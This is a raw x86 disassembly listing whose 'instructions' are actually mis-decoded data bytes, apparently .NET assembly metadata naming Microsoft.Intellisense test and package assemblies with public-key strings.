  403c55:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  403c5c:	cmp    BYTE PTR gs:[esi+0x64],ah
  403c60:	ss popa 
  403c62:	arpl   WORD PTR gs:[eax],di
  403c65:	data16 cmp BYTE PTR [edi],dh
  403c68:	bound  si,DWORD PTR [eax]
  403c6b:	xor    esi,DWORD PTR [edi]
  403c6d:	ss arpl WORD PTR ss:[eax],di
  403c71:	xor    esi,DWORD PTR [ebx+eiz*2]
  403c74:	cmp    DWORD PTR [ecx],edi
  403c76:	cmp    DWORD PTR [edx],esi
  403c78:	xor    DWORD PTR [ebp+0x62],esp
  403c7b:	xor    dh,BYTE PTR [ebx]
  403c7d:	bound  esp,QWORD PTR [ebp+0x37]
  403c80:	cmp    DWORD PTR [ecx+0x64],esp
  403c83:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  403c87:	arpl   WORD PTR [ebx+0x31],sp
  403c8a:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  403c8f:	xor    dh,BYTE PTR [ebx]
  403c91:	xor    DWORD PTR ss:[ebx],esi
  403c94:	xor    dh,BYTE PTR [ecx]
  403c96:	xor    BYTE PTR [edx],dh
  403c98:	cmp    DWORD PTR [eax],esi
  403c9a:	xor    BYTE PTR [edx+0x37],ah
  403c9d:	xor    dh,BYTE PTR [ebx]
  403c9f:	arpl   WORD PTR [esi+0x39],sp
  403ca2:	cmp    BYTE PTR [eax],dh
  403ca4:	cmp    DWORD PTR ds:0x34636637,esi
  403caa:	xor    DWORD PTR gs:[edi],esi
  403cad:	aaa    
  403cae:	xor    DWORD PTR [eax],esi
  403cb0:	cmp    BYTE PTR [esi+0x63],ah
  403cb3:	xor    BYTE PTR ss:[edi],dh
  403cb6:	aaa    
  403cb7:	aaa    
  403cb8:	xor    al,0x66
  403cba:	xor    bh,BYTE PTR [ecx]
  403cbc:	cmp    BYTE PTR gs:[ebx],dh
  403cbf:	xor    dh,BYTE PTR [eax]
  403cc1:	cmp    DWORD PTR gs:[edx],esi
  403cc4:	gs popa 
  403cc6:	xor    BYTE PTR ds:0x34656365,dh
  403ccc:	cmp    BYTE PTR gs:[edx],dh
  403ccf:	xor    DWORD PTR [ebx+0x30],esp
  403cd2:	popa   
  403cd3:	xor    eax,0x38656665
  403cd8:	xor    WORD PTR [esi],si
  403cdb:	xor    al,0x35
  403cdd:	arpl   WORD PTR [ebx+eiz*2],si
  403ce0:	xor    BYTE PTR [ebx+0x39],ah
  403ce3:	xor    esp,DWORD PTR [ebx+0x31]
  403ce6:	popa   
  403ce7:	bound  edi,QWORD PTR [ecx]
  403ce9:	cmp    DWORD PTR [edx],esi
  403ceb:	cmp    BYTE PTR ds:0x32323664,dh
  403cf1:	arpl   WORD PTR [ecx+0x61],sp
  403cf4:	ss xor eax,0x64316332
  403cfa:	popaw  
  403cfc:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  403d02:	xor    eax,0x32663664
  403d07:	fs gs xor eax,0x65373166
  403d0e:	xor    eax,0x30666165
  403d13:	data16 arpl WORD PTR [ecx+edi*1],si
  403d17:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  403d1c:	xor    DWORD PTR [ebx+0x38],esp
  403d1f:	popa   
  403d20:	xor    DWORD PTR [edx],esi
  403d22:	xor    al,0x33
  403d24:	ss xor eax,0x30323831
  403d2a:	ss arpl WORD PTR fs:[eax],si
  403d2e:	cmp    DWORD PTR [ebx],esi
  403d30:	xor    esi,DWORD PTR [esp+esi*1]
  403d33:	fs xor eax,0x39326461
  403d39:	xor    eax,DWORD PTR [eax]
  403d3b:	add    BYTE PTR [ecx-0x7efffe8b],al
  403d41:	outs   dx,DWORD PTR ds:[esi]
  403d42:	dec    ebp
  403d43:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403d4a:	je     0x403d7a
  403d4c:	dec    ecx
  403d4d:	outs   dx,BYTE PTR ds:[esi]
  403d4e:	je     0x403db5
  403d50:	ins    BYTE PTR es:[edi],dx
  403d51:	ins    BYTE PTR es:[edi],dx
  403d52:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x312e6563
  403d5a:	xor    DWORD PTR [esi],ebp
  403d5c:	xor    BYTE PTR [esi],ch
  403d5e:	xor    BYTE PTR [esi],ch
  403d60:	push   esp
  403d61:	gs jae 0x403dd8
  403d64:	jae    0x403d92
  403d66:	and    BYTE PTR [eax+0x75],dl
  403d69:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  403d6d:	dec    ebx
  403d6e:	gs jns 0x403dae
  403d71:	xor    BYTE PTR [eax],dh
  403d73:	xor    dh,BYTE PTR [eax+esi*1]
  403d76:	xor    BYTE PTR [eax],dh
  403d78:	xor    BYTE PTR [eax],dh
  403d7a:	xor    al,0x38
  403d7c:	xor    BYTE PTR [eax],dh
  403d7e:	xor    BYTE PTR [eax],dh
  403d80:	xor    BYTE PTR [ecx],bh
  403d82:	xor    al,0x30
  403d84:	xor    BYTE PTR [eax],dh
  403d86:	xor    BYTE PTR [eax],dh
  403d88:	xor    BYTE PTR [eax],dh
  403d8a:	xor    BYTE PTR ss:[edx],dh
  403d8d:	xor    BYTE PTR [eax],dh
  403d8f:	xor    BYTE PTR [eax],dh
  403d91:	xor    BYTE PTR [eax],dh
  403d93:	xor    dh,BYTE PTR [eax+esi*1]
  403d96:	xor    BYTE PTR [eax],dh
  403d98:	xor    BYTE PTR ds:0x34333532,dh
  403d9e:	xor    DWORD PTR [ebx],esi
  403da0:	xor    DWORD PTR [eax],esi
  403da2:	xor    BYTE PTR [eax],dh
  403da4:	xor    al,0x30
  403da6:	xor    BYTE PTR [eax],dh
  403da8:	xor    BYTE PTR [eax],dh
  403daa:	xor    DWORD PTR [eax],esi
  403dac:	xor    BYTE PTR [eax],dh
  403dae:	xor    DWORD PTR [eax],esi
  403db0:	xor    BYTE PTR [eax],dh
  403db2:	aaa    
  403db3:	xor    DWORD PTR fs:[esi+0x61],esp
  403db7:	xor    eax,0x61346337
  403dbc:	gs cmp DWORD PTR fs:[esi+0x30],esp
  403dc1:	popa   
  403dc2:	xor    esi,DWORD PTR [edx]
  403dc4:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  403dc8:	popa   
  403dc9:	xor    BYTE PTR [esi+0x61],ah
  403dcc:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  403dd3:	cmp    BYTE PTR gs:[esi+0x64],ah
  403dd7:	ss popa 
  403dd9:	arpl   WORD PTR gs:[eax],di
  403ddc:	data16 cmp BYTE PTR [edi],dh
  403ddf:	bound  si,DWORD PTR [eax]
  403de2:	xor    esi,DWORD PTR [edi]
  403de4:	ss arpl WORD PTR ss:[eax],di
  403de8:	xor    esi,DWORD PTR [ebx+eiz*2]
  403deb:	cmp    DWORD PTR [ecx],edi
  403ded:	cmp    DWORD PTR [edx],esi
  403def:	xor    DWORD PTR [ebp+0x62],esp
  403df2:	xor    dh,BYTE PTR [ebx]
  403df4:	bound  esp,QWORD PTR [ebp+0x37]
  403df7:	cmp    DWORD PTR [ecx+0x64],esp
  403dfa:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  403dfe:	arpl   WORD PTR [ebx+0x31],sp
  403e01:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  403e06:	xor    dh,BYTE PTR [ebx]
  403e08:	xor    DWORD PTR ss:[ebx],esi
  403e0b:	xor    dh,BYTE PTR [ecx]
  403e0d:	xor    BYTE PTR [edx],dh
  403e0f:	cmp    DWORD PTR [eax],esi
  403e11:	xor    BYTE PTR [edx+0x37],ah
  403e14:	xor    dh,BYTE PTR [ebx]
  403e16:	arpl   WORD PTR [esi+0x39],sp
  403e19:	cmp    BYTE PTR [eax],dh
  403e1b:	cmp    DWORD PTR ds:0x34636637,esi
  403e21:	xor    DWORD PTR gs:[edi],esi
  403e24:	aaa    
  403e25:	xor    DWORD PTR [eax],esi
  403e27:	cmp    BYTE PTR [esi+0x63],ah
  403e2a:	xor    BYTE PTR ss:[edi],dh
  403e2d:	aaa    
  403e2e:	aaa    
  403e2f:	xor    al,0x66
  403e31:	xor    bh,BYTE PTR [ecx]
  403e33:	cmp    BYTE PTR gs:[ebx],dh
  403e36:	xor    dh,BYTE PTR [eax]
  403e38:	cmp    DWORD PTR gs:[edx],esi
  403e3b:	gs popa 
  403e3d:	xor    BYTE PTR ds:0x34656365,dh
  403e43:	cmp    BYTE PTR gs:[edx],dh
  403e46:	xor    DWORD PTR [ebx+0x30],esp
  403e49:	popa   
  403e4a:	xor    eax,0x38656665
  403e4f:	xor    WORD PTR [esi],si
  403e52:	xor    al,0x35
  403e54:	arpl   WORD PTR [ebx+eiz*2],si
  403e57:	xor    BYTE PTR [ebx+0x39],ah
  403e5a:	xor    esp,DWORD PTR [ebx+0x31]
  403e5d:	popa   
  403e5e:	bound  edi,QWORD PTR [ecx]
  403e60:	cmp    DWORD PTR [edx],esi
  403e62:	cmp    BYTE PTR ds:0x32323664,dh
  403e68:	arpl   WORD PTR [ecx+0x61],sp
  403e6b:	ss xor eax,0x64316332
  403e71:	popaw  
  403e73:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  403e79:	xor    eax,0x32663664
  403e7e:	fs gs xor eax,0x65373166
  403e85:	xor    eax,0x30666165
  403e8a:	data16 arpl WORD PTR [ecx+edi*1],si
  403e8e:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  403e93:	xor    DWORD PTR [ebx+0x38],esp
  403e96:	popa   
  403e97:	xor    DWORD PTR [edx],esi
  403e99:	xor    al,0x33
  403e9b:	ss xor eax,0x30323831
  403ea1:	ss arpl WORD PTR fs:[eax],si
  403ea5:	cmp    DWORD PTR [ebx],esi
  403ea7:	xor    esi,DWORD PTR [esp+esi*1]
  403eaa:	fs xor eax,0x39326461
  403eb0:	xor    eax,DWORD PTR [eax]
  403eb2:	add    BYTE PTR [ecx-0x7efffe88],al
  403eb8:	jb     0x403f07
  403eba:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403ec1:	je     0x403ef1
  403ec3:	dec    ecx
  403ec4:	outs   dx,BYTE PTR ds:[esi]
  403ec5:	je     0x403f2c
  403ec7:	ins    BYTE PTR es:[edi],dx
  403ec8:	ins    BYTE PTR es:[edi],dx
  403ec9:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x442e6563
  403ed1:	bound  esi,QWORD PTR gs:[ebp+0x67]
  403ed5:	addr16 gs jb 0x403f07
  403ed9:	xor    DWORD PTR [ecx],esi
  403edb:	xor    BYTE PTR cs:[esi],ch
  403ede:	xor    BYTE PTR [eax+eiz*1],ch
  403ee1:	push   eax
  403ee2:	jne    0x403f46
  403ee4:	ins    BYTE PTR es:[edi],dx
  403ee5:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  403eec:	xor    BYTE PTR [edx],dh
  403eee:	xor    al,0x30
  403ef0:	xor    BYTE PTR [eax],dh
  403ef2:	xor    BYTE PTR [eax],dh
  403ef4:	xor    al,0x38
  403ef6:	xor    BYTE PTR [eax],dh
  403ef8:	xor    BYTE PTR [eax],dh
  403efa:	xor    BYTE PTR [ecx],bh
  403efc:	xor    al,0x30
  403efe:	xor    BYTE PTR [eax],dh
  403f00:	xor    BYTE PTR [eax],dh
  403f02:	xor    BYTE PTR [eax],dh
  403f04:	xor    BYTE PTR ss:[edx],dh
  403f07:	xor    BYTE PTR [eax],dh
  403f09:	xor    BYTE PTR [eax],dh
  403f0b:	xor    BYTE PTR [eax],dh
  403f0d:	xor    dh,BYTE PTR [eax+esi*1]
  403f10:	xor    BYTE PTR [eax],dh
  403f12:	xor    BYTE PTR ds:0x34333532,dh
  403f18:	xor    DWORD PTR [ebx],esi
  403f1a:	xor    DWORD PTR [eax],esi
  403f1c:	xor    BYTE PTR [eax],dh
  403f1e:	xor    al,0x30
  403f20:	xor    BYTE PTR [eax],dh
  403f22:	xor    BYTE PTR [eax],dh
  403f24:	xor    DWORD PTR [eax],esi
  403f26:	xor    BYTE PTR [eax],dh
  403f28:	xor    DWORD PTR [eax],esi
  403f2a:	xor    BYTE PTR [eax],dh
  403f2c:	aaa    
  403f2d:	xor    DWORD PTR fs:[esi+0x61],esp
  403f31:	xor    eax,0x61346337
  403f36:	gs cmp DWORD PTR fs:[esi+0x30],esp
  403f3b:	popa   
  403f3c:	xor    esi,DWORD PTR [edx]
  403f3e:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  403f42:	popa   
  403f43:	xor    BYTE PTR [esi+0x61],ah
  403f46:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  403f4d:	cmp    BYTE PTR gs:[esi+0x64],ah
  403f51:	ss popa 
  403f53:	arpl   WORD PTR gs:[eax],di
  403f56:	data16 cmp BYTE PTR [edi],dh
  403f59:	bound  si,DWORD PTR [eax]
  403f5c:	xor    esi,DWORD PTR [edi]
  403f5e:	ss arpl WORD PTR ss:[eax],di
  403f62:	xor    esi,DWORD PTR [ebx+eiz*2]
  403f65:	cmp    DWORD PTR [ecx],edi
  403f67:	cmp    DWORD PTR [edx],esi
  403f69:	xor    DWORD PTR [ebp+0x62],esp
  403f6c:	xor    dh,BYTE PTR [ebx]
  403f6e:	bound  esp,QWORD PTR [ebp+0x37]
  403f71:	cmp    DWORD PTR [ecx+0x64],esp
  403f74:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  403f78:	arpl   WORD PTR [ebx+0x31],sp
  403f7b:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  403f80:	xor    dh,BYTE PTR [ebx]
  403f82:	xor    DWORD PTR ss:[ebx],esi
  403f85:	xor    dh,BYTE PTR [ecx]
  403f87:	xor    BYTE PTR [edx],dh
  403f89:	cmp    DWORD PTR [eax],esi
  403f8b:	xor    BYTE PTR [edx+0x37],ah
  403f8e:	xor    dh,BYTE PTR [ebx]
  403f90:	arpl   WORD PTR [esi+0x39],sp
  403f93:	cmp    BYTE PTR [eax],dh
  403f95:	cmp    DWORD PTR ds:0x34636637,esi
  403f9b:	xor    DWORD PTR gs:[edi],esi
  403f9e:	aaa    
  403f9f:	xor    DWORD PTR [eax],esi
  403fa1:	cmp    BYTE PTR [esi+0x63],ah
  403fa4:	xor    BYTE PTR ss:[edi],dh
  403fa7:	aaa    
  403fa8:	aaa    
  403fa9:	xor    al,0x66
  403fab:	xor    bh,BYTE PTR [ecx]
  403fad:	cmp    BYTE PTR gs:[ebx],dh
  403fb0:	xor    dh,BYTE PTR [eax]
  403fb2:	cmp    DWORD PTR gs:[edx],esi
  403fb5:	gs popa 
  403fb7:	xor    BYTE PTR ds:0x34656365,dh
  403fbd:	cmp    BYTE PTR gs:[edx],dh
  403fc0:	xor    DWORD PTR [ebx+0x30],esp
  403fc3:	popa   
  403fc4:	xor    eax,0x38656665
  403fc9:	xor    WORD PTR [esi],si
  403fcc:	xor    al,0x35
  403fce:	arpl   WORD PTR [ebx+eiz*2],si
  403fd1:	xor    BYTE PTR [ebx+0x39],ah
  403fd4:	xor    esp,DWORD PTR [ebx+0x31]
  403fd7:	popa   
  403fd8:	bound  edi,QWORD PTR [ecx]
  403fda:	cmp    DWORD PTR [edx],esi
  403fdc:	cmp    BYTE PTR ds:0x32323664,dh
  403fe2:	arpl   WORD PTR [ecx+0x61],sp
  403fe5:	ss xor eax,0x64316332
  403feb:	popaw  
  403fed:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  403ff3:	xor    eax,0x32663664
  403ff8:	fs gs xor eax,0x65373166
  403fff:	xor    eax,0x30666165
  404004:	data16 arpl WORD PTR [ecx+edi*1],si
  404008:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  40400d:	xor    DWORD PTR [ebx+0x38],esp
  404010:	popa   
  404011:	xor    DWORD PTR [edx],esi
  404013:	xor    al,0x33
  404015:	ss xor eax,0x30323831
  40401b:	ss arpl WORD PTR fs:[eax],si
  40401f:	cmp    DWORD PTR [ebx],esi
  404021:	xor    esi,DWORD PTR [esp+esi*1]
  404024:	fs xor eax,0x39326461
  40402a:	xor    eax,DWORD PTR [eax]
  40402c:	add    BYTE PTR [ecx-0x7efffe82],al
  404032:	js     0x404081
  404034:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40403b:	je     0x40406b
  40403d:	dec    ecx
  40403e:	outs   dx,BYTE PTR ds:[esi]
  40403f:	je     0x4040a6
  404041:	ins    BYTE PTR es:[edi],dx
  404042:	ins    BYTE PTR es:[edi],dx
  404043:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x442e6563
  40404b:	bound  esi,QWORD PTR gs:[ebp+0x67]
  40404f:	addr16 gs jb 0x404081
  404053:	xor    DWORD PTR [ecx],esi
  404055:	xor    BYTE PTR cs:[esi],ch
  404058:	xor    BYTE PTR [esi],ch
  40405a:	push   esp
  40405b:	gs jae 0x4040d2
  40405e:	jae    0x40408c
  404060:	and    BYTE PTR [eax+0x75],dl
  404063:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  404067:	dec    ebx
  404068:	gs jns 0x4040a8
  40406b:	xor    BYTE PTR [eax],dh
  40406d:	xor    dh,BYTE PTR [eax+esi*1]
  404070:	xor    BYTE PTR [eax],dh
  404072:	xor    BYTE PTR [eax],dh
  404074:	xor    al,0x38
  404076:	xor    BYTE PTR [eax],dh
  404078:	xor    BYTE PTR [eax],dh
  40407a:	xor    BYTE PTR [ecx],bh
  40407c:	xor    al,0x30
  40407e:	xor    BYTE PTR [eax],dh
  404080:	xor    BYTE PTR [eax],dh
  404082:	xor    BYTE PTR [eax],dh
  404084:	xor    BYTE PTR ss:[edx],dh
  404087:	xor    BYTE PTR [eax],dh
  404089:	xor    BYTE PTR [eax],dh
  40408b:	xor    BYTE PTR [eax],dh
  40408d:	xor    dh,BYTE PTR [eax+esi*1]
  404090:	xor    BYTE PTR [eax],dh
  404092:	xor    BYTE PTR ds:0x34333532,dh
  404098:	xor    DWORD PTR [ebx],esi
  40409a:	xor    DWORD PTR [eax],esi
  40409c:	xor    BYTE PTR [eax],dh
  40409e:	xor    al,0x30
  4040a0:	xor    BYTE PTR [eax],dh
  4040a2:	xor    BYTE PTR [eax],dh
  4040a4:	xor    DWORD PTR [eax],esi
  4040a6:	xor    BYTE PTR [eax],dh
  4040a8:	xor    DWORD PTR [eax],esi
  4040aa:	xor    BYTE PTR [eax],dh
  4040ac:	aaa    
  4040ad:	xor    DWORD PTR fs:[esi+0x61],esp
  4040b1:	xor    eax,0x61346337
  4040b6:	gs cmp DWORD PTR fs:[esi+0x30],esp
  4040bb:	popa   
  4040bc:	xor    esi,DWORD PTR [edx]
  4040be:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  4040c2:	popa   
  4040c3:	xor    BYTE PTR [esi+0x61],ah
  4040c6:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  4040cd:	cmp    BYTE PTR gs:[esi+0x64],ah
  4040d1:	ss popa 
  4040d3:	arpl   WORD PTR gs:[eax],di
  4040d6:	data16 cmp BYTE PTR [edi],dh
  4040d9:	bound  si,DWORD PTR [eax]
  4040dc:	xor    esi,DWORD PTR [edi]
  4040de:	ss arpl WORD PTR ss:[eax],di
  4040e2:	xor    esi,DWORD PTR [ebx+eiz*2]
  4040e5:	cmp    DWORD PTR [ecx],edi
  4040e7:	cmp    DWORD PTR [edx],esi
  4040e9:	xor    DWORD PTR [ebp+0x62],esp
  4040ec:	xor    dh,BYTE PTR [ebx]
  4040ee:	bound  esp,QWORD PTR [ebp+0x37]
  4040f1:	cmp    DWORD PTR [ecx+0x64],esp
  4040f4:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  4040f8:	arpl   WORD PTR [ebx+0x31],sp
  4040fb:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  404100:	xor    dh,BYTE PTR [ebx]
  404102:	xor    DWORD PTR ss:[ebx],esi
  404105:	xor    dh,BYTE PTR [ecx]
  404107:	xor    BYTE PTR [edx],dh
  404109:	cmp    DWORD PTR [eax],esi
  40410b:	xor    BYTE PTR [edx+0x37],ah
  40410e:	xor    dh,BYTE PTR [ebx]
  404110:	arpl   WORD PTR [esi+0x39],sp
  404113:	cmp    BYTE PTR [eax],dh
  404115:	cmp    DWORD PTR ds:0x34636637,esi
  40411b:	xor    DWORD PTR gs:[edi],esi
  40411e:	aaa    
  40411f:	xor    DWORD PTR [eax],esi
  404121:	cmp    BYTE PTR [esi+0x63],ah
  404124:	xor    BYTE PTR ss:[edi],dh
  404127:	aaa    
  404128:	aaa    
  404129:	xor    al,0x66
  40412b:	xor    bh,BYTE PTR [ecx]
  40412d:	cmp    BYTE PTR gs:[ebx],dh
  404130:	xor    dh,BYTE PTR [eax]
  404132:	cmp    DWORD PTR gs:[edx],esi
  404135:	gs popa 
  404137:	xor    BYTE PTR ds:0x34656365,dh
  40413d:	cmp    BYTE PTR gs:[edx],dh
  404140:	xor    DWORD PTR [ebx+0x30],esp
  404143:	popa   
  404144:	xor    eax,0x38656665
  404149:	xor    WORD PTR [esi],si
  40414c:	xor    al,0x35
  40414e:	arpl   WORD PTR [ebx+eiz*2],si
  404151:	xor    BYTE PTR [ebx+0x39],ah
  404154:	xor    esp,DWORD PTR [ebx+0x31]
  404157:	popa   
  404158:	bound  edi,QWORD PTR [ecx]
  40415a:	cmp    DWORD PTR [edx],esi
  40415c:	cmp    BYTE PTR ds:0x32323664,dh
  404162:	arpl   WORD PTR [ecx+0x61],sp
  404165:	ss xor eax,0x64316332
  40416b:	popaw  
  40416d:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  404173:	xor    eax,0x32663664
  404178:	fs gs xor eax,0x65373166
  40417f:	xor    eax,0x30666165
  404184:	data16 arpl WORD PTR [ecx+edi*1],si
  404188:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  40418d:	xor    DWORD PTR [ebx+0x38],esp
  404190:	popa   
  404191:	xor    DWORD PTR [edx],esi
  404193:	xor    al,0x33
  404195:	ss xor eax,0x30323831
  40419b:	ss arpl WORD PTR fs:[eax],si
  40419f:	cmp    DWORD PTR [ebx],esi
  4041a1:	xor    esi,DWORD PTR [esp+esi*1]
  4041a4:	fs xor eax,0x39326461
  4041aa:	xor    eax,DWORD PTR [eax]
  4041ac:	add    BYTE PTR [ecx-0x7efffe89],al
  4041b2:	jno    0x404201
  4041b4:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4041bb:	je     0x4041eb
  4041bd:	dec    ecx
  4041be:	outs   dx,BYTE PTR ds:[esi]
  4041bf:	je     0x404226
  4041c1:	ins    BYTE PTR es:[edi],dx
  4041c2:	ins    BYTE PTR es:[edi],dx
  4041c3:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x502e6563
  4041cb:	popa   
  4041cc:	arpl   WORD PTR [ebx+0x61],bp
  4041cf:	gs xor DWORD PTR cs:[bx+di],esi
  4041d4:	xor    BYTE PTR cs:[esi],ch
  4041d7:	xor    BYTE PTR [eax+eiz*1],ch
  4041da:	push   eax
  4041db:	jne    0x40423f
  4041dd:	ins    BYTE PTR es:[edi],dx
  4041de:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  4041e5:	xor    BYTE PTR [edx],dh
  4041e7:	xor    al,0x30
  4041e9:	xor    BYTE PTR [eax],dh
  4041eb:	xor    BYTE PTR [eax],dh
  4041ed:	xor    al,0x38
  4041ef:	xor    BYTE PTR [eax],dh
  4041f1:	xor    BYTE PTR [eax],dh
  4041f3:	xor    BYTE PTR [ecx],bh
  4041f5:	xor    al,0x30
  4041f7:	xor    BYTE PTR [eax],dh
  4041f9:	xor    BYTE PTR [eax],dh
  4041fb:	xor    BYTE PTR [eax],dh
  4041fd:	xor    BYTE PTR ss:[edx],dh
  404200:	xor    BYTE PTR [eax],dh
  404202:	xor    BYTE PTR [eax],dh
  404204:	xor    BYTE PTR [eax],dh
  404206:	xor    dh,BYTE PTR [eax+esi*1]
  404209:	xor    BYTE PTR [eax],dh
  40420b:	xor    BYTE PTR ds:0x34333532,dh
  404211:	xor    DWORD PTR [ebx],esi
  404213:	xor    DWORD PTR [eax],esi
  404215:	xor    BYTE PTR [eax],dh
  404217:	xor    al,0x30
  404219:	xor    BYTE PTR [eax],dh
  40421b:	xor    BYTE PTR [eax],dh
  40421d:	xor    DWORD PTR [eax],esi
  40421f:	xor    BYTE PTR [eax],dh
  404221:	xor    DWORD PTR [eax],esi
  404223:	xor    BYTE PTR [eax],dh
  404225:	aaa    
  404226:	xor    DWORD PTR fs:[esi+0x61],esp
  40422a:	xor    eax,0x61346337
  40422f:	gs cmp DWORD PTR fs:[esi+0x30],esp
  404234:	popa   
  404235:	xor    esi,DWORD PTR [edx]
  404237:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  40423b:	popa   
  40423c:	xor    BYTE PTR [esi+0x61],ah
  40423f:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  404246:	cmp    BYTE PTR gs:[esi+0x64],ah
  40424a:	ss popa 
  40424c:	arpl   WORD PTR gs:[eax],di
  40424f:	data16 cmp BYTE PTR [edi],dh
  404252:	bound  si,DWORD PTR [eax]
  404255:	xor    esi,DWORD PTR [edi]
  404257:	ss arpl WORD PTR ss:[eax],di
  40425b:	xor    esi,DWORD PTR [ebx+eiz*2]
  40425e:	cmp    DWORD PTR [ecx],edi
  404260:	cmp    DWORD PTR [edx],esi
  404262:	xor    DWORD PTR [ebp+0x62],esp
  404265:	xor    dh,BYTE PTR [ebx]
  404267:	bound  esp,QWORD PTR [ebp+0x37]
  40426a:	cmp    DWORD PTR [ecx+0x64],esp
  40426d:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  404271:	arpl   WORD PTR [ebx+0x31],sp
  404274:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  404279:	xor    dh,BYTE PTR [ebx]
  40427b:	xor    DWORD PTR ss:[ebx],esi
  40427e:	xor    dh,BYTE PTR [ecx]
  404280:	xor    BYTE PTR [edx],dh
  404282:	cmp    DWORD PTR [eax],esi
  404284:	xor    BYTE PTR [edx+0x37],ah
  404287:	xor    dh,BYTE PTR [ebx]
  404289:	arpl   WORD PTR [esi+0x39],sp
  40428c:	cmp    BYTE PTR [eax],dh
  40428e:	cmp    DWORD PTR ds:0x34636637,esi
  404294:	xor    DWORD PTR gs:[edi],esi
  404297:	aaa    
  404298:	xor    DWORD PTR [eax],esi
  40429a:	cmp    BYTE PTR [esi+0x63],ah
  40429d:	xor    BYTE PTR ss:[edi],dh
  4042a0:	aaa    
  4042a1:	aaa    
  4042a2:	xor    al,0x66
  4042a4:	xor    bh,BYTE PTR [ecx]
  4042a6:	cmp    BYTE PTR gs:[ebx],dh
  4042a9:	xor    dh,BYTE PTR [eax]
  4042ab:	cmp    DWORD PTR gs:[edx],esi
  4042ae:	gs popa 
  4042b0:	xor    BYTE PTR ds:0x34656365,dh
  4042b6:	cmp    BYTE PTR gs:[edx],dh
  4042b9:	xor    DWORD PTR [ebx+0x30],esp
  4042bc:	popa   
  4042bd:	xor    eax,0x38656665
  4042c2:	xor    WORD PTR [esi],si
  4042c5:	xor    al,0x35
  4042c7:	arpl   WORD PTR [ebx+eiz*2],si
  4042ca:	xor    BYTE PTR [ebx+0x39],ah
  4042cd:	xor    esp,DWORD PTR [ebx+0x31]
  4042d0:	popa   
  4042d1:	bound  edi,QWORD PTR [ecx]
  4042d3:	cmp    DWORD PTR [edx],esi
  4042d5:	cmp    BYTE PTR ds:0x32323664,dh
  4042db:	arpl   WORD PTR [ecx+0x61],sp
  4042de:	ss xor eax,0x64316332
  4042e4:	popaw  
  4042e6:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  4042ec:	xor    eax,0x32663664
  4042f1:	fs gs xor eax,0x65373166
  4042f8:	xor    eax,0x30666165
  4042fd:	data16 arpl WORD PTR [ecx+edi*1],si
  404301:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  404306:	xor    DWORD PTR [ebx+0x38],esp
  404309:	popa   
  40430a:	xor    DWORD PTR [edx],esi
  40430c:	xor    al,0x33
  40430e:	ss xor eax,0x30323831
  404314:	ss arpl WORD PTR fs:[eax],si
  404318:	cmp    DWORD PTR [ebx],esi
  40431a:	xor    esi,DWORD PTR [esp+esi*1]
  40431d:	fs xor eax,0x39326461
  404323:	xor    eax,DWORD PTR [eax]
  404325:	add    BYTE PTR [ecx-0x7efffe83],al
  40432b:	ja     0x40437a
  40432d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404334:	je     0x404364
  404336:	dec    ecx
  404337:	outs   dx,BYTE PTR ds:[esi]
  404338:	je     0x40439f
  40433a:	ins    BYTE PTR es:[edi],dx
  40433b:	ins    BYTE PTR es:[edi],dx
  40433c:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x502e6563
  404344:	popa   
  404345:	arpl   WORD PTR [ebx+0x61],bp
  404348:	gs xor DWORD PTR cs:[bx+di],esi
  40434d:	xor    BYTE PTR cs:[esi],ch
  404350:	xor    BYTE PTR [esi],ch
  404352:	push   esp
  404353:	gs jae 0x4043ca
  404356:	jae    0x404384
  404358:	and    BYTE PTR [eax+0x75],dl
  40435b:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  40435f:	dec    ebx
  404360:	gs jns 0x4043a0
  404363:	xor    BYTE PTR [eax],dh
  404365:	xor    dh,BYTE PTR [eax+esi*1]
  404368:	xor    BYTE PTR [eax],dh
  40436a:	xor    BYTE PTR [eax],dh
  40436c:	xor    al,0x38
  40436e:	xor    BYTE PTR [eax],dh
  404370:	xor    BYTE PTR [eax],dh
  404372:	xor    BYTE PTR [ecx],bh
  404374:	xor    al,0x30
  404376:	xor    BYTE PTR [eax],dh
